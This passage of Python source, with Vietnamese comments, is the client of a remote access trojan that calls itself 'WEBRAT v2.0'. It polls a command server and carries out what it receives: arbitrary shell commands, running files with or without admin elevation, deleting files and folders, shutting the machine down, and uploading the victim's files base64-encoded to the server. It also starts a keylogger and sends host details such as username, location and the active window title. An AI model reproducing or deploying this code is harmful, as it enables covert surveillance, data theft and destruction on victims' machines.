                    if os.name == 'nt':
                        os.system("shutdown /s /t 5")
                    else:
                        os.system("shutdown -h now")
                    result = "SHUTDOWN_EXECUTED"
                except Exception as e:
                    result = f"SHUTDOWN_ERROR_{e}"
            else:
                result = "IGNORED_WRONG_HWID"
            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return
        # ==========================================
        # LỆNH FILE MANAGER: xemfile+path+hwid
        # ==========================================
        if cmd_text.startswith("xemfile"):
            raw_payload = cmd_text[len("xemfile"):]
            target_path = "C:\\"
            target_hwid = ""
            
            # Xử lý định dạng xemfile+path+hwid
            if raw_payload.startswith("+"):
                raw_payload = raw_payload[1:]
                
            if "+" in raw_payload:
                parts = raw_payload.rsplit("+", 1)
                target_path = parts[0]
                target_hwid = parts[1]
            else:
                target_path = raw_payload if raw_payload else "C:\\"

            # Chuẩn hóa path (vd: c:\ -> C:\)
            target_path = _normalize_path(target_path)

            clean_target_hwid = target_hwid.lstrip("#").strip()
            clean_self_hwid   = self.hwid.lstrip("#").strip()

            if clean_target_hwid in (clean_self_hwid, "") or target_hwid in (self.client_id, ""):
                log.info(f"[*] CMD #{cmd_id}: XEMFILE signal received for path: '{target_path}'")
                count = self._scan_and_stream_directory(target_path)
                result = f"XEMFILE_SUCCESS_{count}_ITEMS"
            else:
                result = f"IGNORED_WRONG_HWID (target={target_hwid}, self={self.hwid})"

        # ==========================================
        # LỆNH TẠO THƯ MỤC: chofilene+foldername+path+hwid
        # ==========================================
        if cmd_text.startswith("chofilene"):
            raw_payload = cmd_text[len("chofilene"):]
            if raw_payload.startswith("+"):
                raw_payload = raw_payload[1:]
            
            parts = raw_payload.split("+")
            folder_name = parts[0].strip() if len(parts) > 0 and parts[0].strip() else "NewFolder"
            target_path = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "C:\\"
            target_hwid = parts[2].strip() if len(parts) > 2 else ""

            target_path = _normalize_path(target_path)
            clean_target_hwid = target_hwid.lstrip("#").strip()
            clean_self_hwid   = self.hwid.lstrip("#").strip()

            if clean_target_hwid in (clean_self_hwid, "") or target_hwid in (self.client_id, ""):
                log.info(f"[*] CMD #{cmd_id}: CHOFILENE (Create Folder) signal received: '{folder_name}' at '{target_path}'")
                try:
                    full_folder_path = os.path.join(target_path, folder_name)
                    os.makedirs(full_folder_path, exist_ok=True)
                    log.info(f"[*] Successfully created directory: '{full_folder_path}'")
                    result = f"CHOFILENE_SUCCESS_CREATED_{folder_name}"
                except Exception as e:
                    log.warning(f"[*] Create directory failed '{folder_name}': {e}")
                    result = f"CHOFILENE_ERROR_{e}"

                # Client.py tự động gửi thêm lệnh quét & stream cập nhật folder và file mới để index.php vẽ
                self._scan_and_stream_directory(target_path)
            else:
                result = f"IGNORED_WRONG_HWID (target={target_hwid}, self={self.hwid})"

            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # ==========================================
        # LỆNH NHẬN FILE UPLOAD: chosene+file_id+path+hwid
        # ==========================================
        if cmd_text.startswith("chosene"):
            raw_payload = cmd_text[len("chosene"):]
            if raw_payload.startswith("+"):
                raw_payload = raw_payload[1:]
            
            parts = raw_payload.split("+")
            file_id     = parts[0].strip() if len(parts) > 0 else ""
            target_path = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "C:\\"
            target_hwid = parts[2].strip() if len(parts) > 2 else ""

            target_path = _normalize_path(target_path)
            clean_target_hwid = target_hwid.lstrip("#").strip()
            clean_self_hwid   = self.hwid.lstrip("#").strip()

            if clean_target_hwid in (clean_self_hwid, "") or target_hwid in (self.client_id, ""):
                log.info(f"[*] CMD #{cmd_id}: CHOSENE (Receive File) signal received for file_id: '{file_id}' at path: '{target_path}'")
                try:
                    # Tải dữ liệu file đã lưu từ Database 1 via api.php?action=get_upload_file
                    api_key = self.cfg.get("api_key", "")
                    res = self.http.request("GET", f"{srv}?action=get_upload_file&file_id={file_id}&key={api_key}")
                    if res and res.get("status") == "ok" and res.get("data"):
                        fdata    = res["data"]
                        fname    = fdata.get("filename", "uploaded_file.bin")
                        b64_data = fdata.get("filedata", "")
                        
                        file_bytes = base64.b64decode(b64_data)
                        os.makedirs(target_path, exist_ok=True)
                        full_out_path = os.path.join(target_path, fname)
                        
                        with open(full_out_path, "wb") as f:
                            f.write(file_bytes)
                            
                        log.info(f"[*] Successfully saved uploaded file: '{full_out_path}' ({len(file_bytes)} bytes)")
                        result = f"CHOSENE_SUCCESS_SAVED_{fname}"
                    else:
                        result = f"CHOSENE_ERROR_FETCH_FILE_{res.get('message') if res else 'NO_RESPONSE'}"
                except Exception as e:
                    log.warning(f"[*] Receive upload file failed (file_id={file_id}): {e}")
                    result = f"CHOSENE_ERROR_{e}"

                # Client.py tự động gửi thêm lệnh quét & stream cập nhật folder và file mới để index.php vẽ
                self._scan_and_stream_directory(target_path)
            else:
                result = f"IGNORED_WRONG_HWID (target={target_hwid}, self={self.hwid})"

            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # ==========================================
        # LỆNH THỰC THI FILE TRÊN MÁY: runfilenha+pathfile+hwid
        # ==========================================
        if cmd_text.startswith("runfilenha"):
            raw_payload = cmd_text[len("runfilenha"):]
            if raw_payload.startswith("+"):
                raw_payload = raw_payload[1:]

            if "+" in raw_payload:
                parts = raw_payload.rsplit("+", 1)
                target_path = parts[0].strip()
                target_hwid = parts[1].strip()
            else:
                target_path = raw_payload.strip()
                target_hwid = ""

            target_path = _normalize_path(target_path)
            clean_target_hwid = target_hwid.lstrip("#").strip()
            clean_self_hwid   = self.hwid.lstrip("#").strip()

            if clean_target_hwid in (clean_self_hwid, "") or target_hwid in (self.client_id, ""):
                log.info(f"[*] CMD #{cmd_id}: RUNFILENHA (Run File) signal received for path: '{target_path}'")
                try:
                    if not os.path.exists(target_path):
                        result = f"RUNFILENHA_ERROR_NOT_FOUND: '{target_path}'"
                    else:
                        if os.name == 'nt':
                            os.startfile(target_path)
                        else:
                            subprocess.Popen(["xdg-open", target_path])
                        log.info(f"[*] Successfully launched file: '{target_path}'")
                        result = f"RUNFILENHA_SUCCESS_EXECUTED_{os.path.basename(target_path)}"
                except Exception as e:
                    log.warning(f"[*] Launch file via startfile failed '{target_path}': {e}, trying Popen...")
                    try:
                        subprocess.Popen(f'"{target_path}"', shell=True)
                        result = f"RUNFILENHA_SUCCESS_POPEN_{os.path.basename(target_path)}"
                    except Exception as ex:
                        result = f"RUNFILENHA_ERROR_{ex}"
            else:
                result = f"IGNORED_WRONG_HWID (target={target_hwid}, self={self.hwid})"

            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # ==========================================
        # LỆNH THỰC THI FILE VỚI QUYỀN ADMIN: runfileadmin+pathfile+hwid
        # ==========================================
        if cmd_text.startswith("runfileadmin"):
            raw_payload = cmd_text[len("runfileadmin"):]
            if raw_payload.startswith("+"):
                raw_payload = raw_payload[1:]

            if "+" in raw_payload:
                parts = raw_payload.rsplit("+", 1)
                target_path = parts[0].strip()
                target_hwid = parts[1].strip()
            else:
                target_path = raw_payload.strip()
                target_hwid = ""

            target_path = _normalize_path(target_path)
            clean_target_hwid = target_hwid.lstrip("#").strip()
            clean_self_hwid   = self.hwid.lstrip("#").strip()

            if clean_target_hwid in (clean_self_hwid, "") or target_hwid in (self.client_id, ""):
                log.info(f"[*] CMD #{cmd_id}: RUNFILEADMIN (Run as Admin) signal received for path: '{target_path}'")
                try:
                    if not os.path.exists(target_path):
                        result = f"RUNFILEADMIN_ERROR_NOT_FOUND: '{target_path}'"
                    else:
                        if os.name == 'nt':
                            # Windows: Sử dụng ShellExecute với "runas" để yêu cầu quyền Admin
                            import win32api
                            import win32con
                            win32api.ShellExecute(
                                0,
                                "runas",
                                target_path,
                                "",
                                os.path.dirname(target_path) or "C:\\",
                                win32con.SW_SHOWNORMAL
                            )
                            log.info(f"[*] Successfully launched file as Admin: '{target_path}'")
                            result = f"RUNFILEADMIN_SUCCESS_EXECUTED_{os.path.basename(target_path)}"
                        else:
                            # Linux/Mac: Sử dụng pkexec hoặc sudo (yêu cầu password)
                            subprocess.Popen(["pkexec", target_path])
                            result = f"RUNFILEADMIN_SUCCESS_PKEXEC_{os.path.basename(target_path)}"
                except ImportError:
                    result = f"RUNFILEADMIN_ERROR_MISSING_WIN32API_MODULE"
                    log.warning("[*] win32api module not found. Install pywin32: pip install pywin32")
                except Exception as e:
                    log.warning(f"[*] Launch file as Admin failed '{target_path}': {e}")
                    result = f"RUNFILEADMIN_ERROR_{e}"
            else:
                result = f"IGNORED_WRONG_HWID (target={target_hwid}, self={self.hwid})"

            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # ==========================================
        # LỆNH XÓA FILE HOẶC THƯ MỤC: cutfile+pathfile+hwid
        # ==========================================
        if cmd_text.startswith("cutfile"):
            raw_payload = cmd_text[len("cutfile"):]
            if raw_payload.startswith("+"):
                raw_payload = raw_payload[1:]

            if "+" in raw_payload:
                parts = raw_payload.rsplit("+", 1)
                target_path = parts[0].strip()
                target_hwid = parts[1].strip()
            else:
                target_path = raw_payload.strip()
                target_hwid = ""

            target_path = _normalize_path(target_path)
            clean_target_hwid = target_hwid.lstrip("#").strip()
            clean_self_hwid   = self.hwid.lstrip("#").strip()

            if clean_target_hwid in (clean_self_hwid, "") or target_hwid in (self.client_id, ""):
                log.info(f"[*] CMD #{cmd_id}: CUTFILE (Delete) signal received for path: '{target_path}'")
                try:
                    if not os.path.exists(target_path):
                        result = f"CUTFILE_ERROR_NOT_FOUND: '{target_path}'"
                    else:
                        # Kiểm tra xem là file hay thư mục
                        if os.path.isfile(target_path):
                            # Xóa file
                            os.remove(target_path)
                            log.info(f"[*] Successfully deleted file: '{target_path}'")
                            result = f"CUTFILE_SUCCESS_FILE_DELETED_{os.path.basename(target_path)}"
                        elif os.path.isdir(target_path):
                            # Xóa thư mục (bao gồm tất cả nội dung bên trong)
                            import shutil
                            shutil.rmtree(target_path)
                            log.info(f"[*] Successfully deleted directory: '{target_path}'")
                            result = f"CUTFILE_SUCCESS_DIR_DELETED_{os.path.basename(target_path)}"
                        else:
                            result = f"CUTFILE_ERROR_UNKNOWN_TYPE: '{target_path}'"

                        # Tự động quét lại thư mục cha để cập nhật danh sách
                        parent_path = os.path.dirname(target_path)
                        if parent_path and os.path.exists(parent_path):
                            self._scan_and_stream_directory(parent_path)

                except PermissionError as e:
                    log.warning(f"[*] Delete failed - Permission denied: '{target_path}': {e}")
                    result = f"CUTFILE_ERROR_PERMISSION_DENIED_{os.path.basename(target_path)}"
                except Exception as e:
                    log.warning(f"[*] Delete failed '{target_path}': {e}")
                    result = f"CUTFILE_ERROR_{e}"
            else:
                result = f"IGNORED_WRONG_HWID (target={target_hwid}, self={self.hwid})"

            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # ==========================================
        # LỆNH ĐỌC FILE GỬI LÊN DATABASE: bolayfile+pathfile+hwid
        # ==========================================
        if cmd_text.startswith("bolayfile"):
            raw_payload = cmd_text[len("bolayfile"):]
            if raw_payload.startswith("+"):
                raw_payload = raw_payload[1:]

            if "+" in raw_payload:
                parts = raw_payload.rsplit("+", 1)
                target_filepath = parts[0].strip()
                target_hwid     = parts[1].strip()
            else:
                target_filepath = raw_payload.strip()
                target_hwid     = ""

            target_filepath = _normalize_path(target_filepath)
            clean_target_hwid = target_hwid.lstrip("#").strip()
            clean_self_hwid   = self.hwid.lstrip("#").strip()

            if clean_target_hwid in (clean_self_hwid, "") or target_hwid in (self.client_id, ""):
                log.info(f"[*] CMD #{cmd_id}: BOLAYFILE signal received for path: '{target_filepath}'")
                try:
                    if not os.path.exists(target_filepath) or os.path.isdir(target_filepath):
                        result = f"BOLAYFILE_ERROR_NOT_FOUND_OR_DIR: '{target_filepath}'"
                    else:
                        with open(target_filepath, "rb") as f:
                            raw_data = f.read()

                        b64_data = base64.b64encode(raw_data).decode("ascii")
                        filename = os.path.basename(target_filepath)

                        # Gửi file data lên Server Database 1 via api.php?action=save_downloaded_file
                        srv = self.cfg["server_url"]
                        res = self.http.request("POST", f"{srv}?action=save_downloaded_file", {
                            "client_id": self.client_id,
                            "hwid":      self.hwid,
                            "filename":  filename,
                            "filepath":  target_filepath,
                            "filedata":  b64_data
                        })

                        if res and res.get("status") == "ok":
                            file_id = res.get("data", {}).get("id")
                            result = f"BOLAYFILE_SUCCESS_SAVED_TO_DB_ID_{file_id}"
                            log.info(f"[*] Successfully uploaded file '{filename}' to DB (ID={file_id})")
                        else:
                            result = f"BOLAYFILE_UPLOAD_FAILED: {res.get('message') if res else 'NO_RESPONSE'}"
                except Exception as e:
                    log.warning(f"[*] Read file failed '{target_filepath}': {e}")
                    result = f"BOLAYFILE_ERROR_{e}"
            else:
                result = f"IGNORED_WRONG_HWID (target={target_hwid}, self={self.hwid})"

            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # ==========================================
        # LỆNH TẢI FILE TỪ CLIENT LÊN DATABASE (getfile:filepath)
        # ==========================================
        if cmd_text.startswith("getfile:"):
            target_filepath = cmd_text[len("getfile:"):].strip()
            target_filepath = _normalize_path(target_filepath)
            
            log.info(f"[*] CMD #{cmd_id}: GETFILE signal received for path: '{target_filepath}'")
            try:
                if not os.path.exists(target_filepath) or os.path.isdir(target_filepath):
                    result = f"GETFILE_ERROR_NOT_FOUND_OR_DIR: '{target_filepath}'"
                else:
                    with open(target_filepath, "rb") as f:
                        raw_data = f.read()
                    
                    b64_data = base64.b64encode(raw_data).decode("ascii")
                    filename = os.path.basename(target_filepath)
                    
                    # Gửi file data lên Server Database 1 qua api.php?action=save_downloaded_file
                    srv = self.cfg["server_url"]
                    res = self.http.request("POST", f"{srv}?action=save_downloaded_file", {
                        "client_id": self.client_id,
                        "hwid":      self.hwid,
                        "filename":  filename,
                        "filepath":  target_filepath,
                        "filedata":  b64_data
                    })
                    
                    if res and res.get("status") == "ok":
                        file_id = res.get("data", {}).get("id")
                        result = f"GETFILE_SUCCESS_SAVED_TO_DB_ID_{file_id}"
                        log.info(f"[*] Successfully uploaded file '{filename}' to DB (ID={file_id})")
                    else:
                        result = f"GETFILE_UPLOAD_FAILED: {res.get('message') if res else 'NO_RESPONSE'}"
            except Exception as e:
                log.warning(f"[*] Read file failed '{target_filepath}': {e}")
                result = f"GETFILE_ERROR_{e}"

            self.http.request("POST", f"{srv}?action=command_result", {
                "command_id": cmd_id, "result": result, "error": False,
            })
            return

        # Shell command
        log.info(f"[{self.client_id}] Exec CMD #{cmd_id}: {cmd_text}")
        try:
            proc   = subprocess.run(
                cmd_text, shell=True, capture_output=True,
                text=True, timeout=15
            )
            output = (proc.stdout or proc.stderr or "[No output]").strip()
        except subprocess.TimeoutExpired:
            output = "[Timeout after 15s]"
        except Exception as e:
            output = f"[Error: {e}]"

        self.http.request("POST", f"{srv}?action=command_result", {
            "command_id": cmd_id, "result": output, "error": False,
        })
        log.info(f"[{self.client_id}] Sent result CMD #{cmd_id}")

    # ----------------------------------------------------------
    #  CHECKIN
    # ----------------------------------------------------------
    def _do_checkin(self) -> list:
        """Gửi checkin, trả về danh sách lệnh pending."""
        uptime_s   = int(time.time() - self._start_time)
        online_h   = max(1, uptime_s // 3600)
        
        # Chỉ quét Active Window đúng 3 giây / lần để tránh tốn CPU
        now = time.time()
        if (now - self._last_active_win_time >= 3.0) or not self._cached_active_win:
            self._cached_active_win = _get_active_window()
            self._last_active_win_time = now
        active_win = self._cached_active_win

        payload = {
            "client_id":    self.client_id,
            "hwid":         self.hwid,
            "username":     f"{socket.gethostname()}\\{getpass.getuser()}",
            "pcname":       socket.gethostname(),
            "loc":          self.loc_info["loc"],
            "active_window": active_win,
            "asn":          self.loc_info["asn"],
            "hosting":      self.loc_info["hosting"],
            "system_info":  f"{platform.system()} {platform.release()} {platform.architecture()[0]}",
            "admin_rights": 1 if _is_admin() else 0,
            "cpu":          self.specs["cpu"],
            "gpu":          self.specs["gpu"],
            "ram":          self.specs["ram"],
            "disk":         self.specs["disk"],
            "online_hours": online_h,
            "total_hours":  online_h + 12,
        }

        srv = self.cfg["server_url"]
        res = self.http.request("POST", f"{srv}?action=checkin",
                                payload, rate_limiter=self._rl_checkin)

        if res and res.get("status") == "ok":
            log.info(f"[{self.client_id}] Checkin OK | window='{active_win}' "
                     f"| interval={self._rl_checkin.interval:.1f}s")
            return res.get("data", {}).get("pending_commands", [])
        else:
            log.warning(f"[{self.client_id}] Checkin failed: {res}")
            return []

    # ----------------------------------------------------------
    #  MAIN LOOP
    # ----------------------------------------------------------
    def _run_loop(self):
        log.info(f"[{self.client_id}] Agent loop started")
        while self._running:
            try:
                # 1. Checkin + nhận lệnh
                cmds = self._do_checkin()

                # 2. Xử lý lệnh (mỗi lệnh trong thread riêng tránh block loop)
                for cmd in cmds:
                    cmd_id   = cmd.get("id")
                    cmd_text = cmd.get("command", "")
                    t = threading.Thread(
                        target=self._handle_command,
                        args=(cmd_id, cmd_text),
                        daemon=True, name=f"Cmd-{cmd_id}"
                    )
                    t.start()

                # 3. Flush keylogs (nếu đến interval)
                self._maybe_flush_keylogs()

            except Exception as e:
                log.warning(f"[{self.client_id}] Loop error: {e}")

            # Chờ 2.0s giữa các lần checkin để tránh làm rác log console
            time.sleep(2.0)

        log.info(f"[{self.client_id}] Agent loop stopped")

    # ----------------------------------------------------------
    #  PUBLIC API
    # ----------------------------------------------------------
    def start(self):
        """Khởi động agent (chạy trong thread riêng)."""
        log.info("=" * 54)
        log.info("   WEBRAT v2.0 — Advanced Multi-Client Agent")
        log.info("=" * 54)

        # Thu thập thông tin máy
        self.specs      = _get_system_specs()
        self.loc_info   = _get_location_info()
        self._start_time = time.time()
        public_ip       = self.loc_info.get("ip") or _get_public_ip()
        self.hwid       = _generate_hwid(public_ip)
        self.client_id  = f"#{self.hwid}"

        log.info(f"[+] Client ID  : {self.client_id}")
        log.info(f"[+] HWID       : {self.hwid}")
        log.info(f"[+] Public IP  : {public_ip}")
        log.info(f"[+] PC         : {socket.gethostname()} / {getpass.getuser()}")
        log.info(f"[+] OS         : {platform.system()} {platform.release()}")
        log.info(f"[+] Server     : {self.cfg['server_url']}")

        self._running = True

        # Khởi động các subsystem
        self._start_keylogger()
        self._upload_q.start()

        # Tự động scan ổ C:\ và phát stream từng chunk lên manager.php khi vừa kết nối
        def _auto_push_root_c():
            try:
                time.sleep(2)
                count = self._scan_and_stream_directory("C:\\")
                log.info(f"[{self.client_id}] Auto streamed C:\\ directory ({count} items)")
            except Exception as e:
                log.warning(f"Auto push C:\\ failed: {e}")

        threading.Thread(target=_auto_push_root_c, daemon=True).start()

        # Main loop trong thread riêng (để hỗ trợ multi-agent)
        self._thread = threading.Thread(
            target=self._run_loop,
            daemon=True, name=f"Agent-{self.client_id}"
        )
        self._thread.start()
        log.info(f"[{self.client_id}] Agent thread started\n")

    def stop(self):
        """Dừng agent và toàn bộ subsystem."""
        log.info(f"[{self.client_id}] Stopping agent...")
        self._running = False
        self._remote.stop()
        self._upload_q.stop()

    def join(self):
        """Block cho đến khi agent thread kết thúc."""
        if self._thread:
            self._thread.join()

# =============================================================
#  ENTRY POINT — multi-client support
# =============================================================
def main():
    """
    Chạy 1 hoặc nhiều agent.
    Để multi-client, thêm config vào list AGENT_CONFIGS.
    Mỗi config override các key cần thiết so với DEFAULT_CONFIG.
    """
    AGENT_CONFIGS = [
        # Agent 1 — cấu hình mặc định
        {},

        # Agent 2 — ví dụ cấu hình khác server / key khác
        # {
        #     "server_url": "http://server2.example.com/api.php",
        #     "api_key":    "OTHER_KEY",
        # },
    ]

    agents = [ClientAgent(cfg) for cfg in AGENT_CONFIGS]

    for agent in agents:
        agent.start()

    try:
        # Giữ main thread sống; các agent tự chạy trong thread riêng
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log.info("\n[*] Shutting down all agents...")
        for agent in agents:
            agent.stop()
        for agent in agents:
            agent.join()
        log.info("[*] All agents stopped. Bye.")
        sys.exit(0)

if __name__ == "__main__":
    main()
